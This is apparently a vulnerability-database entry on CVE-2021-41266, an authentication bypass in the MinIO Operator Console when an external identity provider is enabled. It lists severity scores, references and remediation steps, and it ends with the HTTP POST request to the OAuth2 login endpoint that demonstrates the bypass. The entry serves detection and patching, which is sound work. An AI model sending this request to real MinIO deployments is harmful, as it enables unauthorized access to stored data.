---
layout: post
cve_id: CVE-2021-41266
title: MinIO Operator Console Authentication Bypass
pcap: true
pcap_path: /pcaps/2021/CVE-2021-41266.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-41266.yaml
snort2_rule: N/A
snort3_rule: N/A
author: alevsk
severity: critical
impact: 'An attacker can bypass authentication and gain unauthorized access to the
  MinIO Operator Console.

  '
remediation: 'Update to v.0.12.3 or higher. Users unable to upgrade should add automountServiceAccountToken:
  false to the operator-console deployment in Kubernetes so no service account token
  will get mounted inside the pod, then disable the external identity provider authentication
  by unset the CONSOLE_IDP_URL, CONSOLE_IDP_CLIENT_ID, CONSOLE_IDP_SECRET and CONSOLE_IDP_CALLBACK
  environment variable and instead use the Kubernetes service account token.'
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2021-41266
- https://github.com/minio/console/security/advisories/GHSA-4999-659w-mq36
- https://github.com/minio/console/pull/1217
- https://github.com/HimmelAward/Goby_POC
- https://github.com/StarCrossPortal/scalpel
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-41266
  cwe-id: CWE-306
  epss-score: 0.79997
  epss-percentile: 0.99066
  cpe: cpe:2.3:a:min:minio_console:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: min
  product: minio_console
tags:
- cve2021
- cve
- minio
- min
- vkev
- vuln
---

## üîç Vulnerability Description
MinIO Console is a graphical user interface for the for MinIO Operator. MinIO itself is a multi-cloud object storage project. Affected versions are subject to an authentication bypass issue in the Operator Console when an external IDP is enabled.


## üåê HTTP Request
```nohighlight
POST /api/v1/login/oauth2/auth HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586
Connection: close
Content-Length: 30
Accept: */*
Content-Type: application/json
Accept-Encoding: gzip

{"code":"test","state":"test"}
```

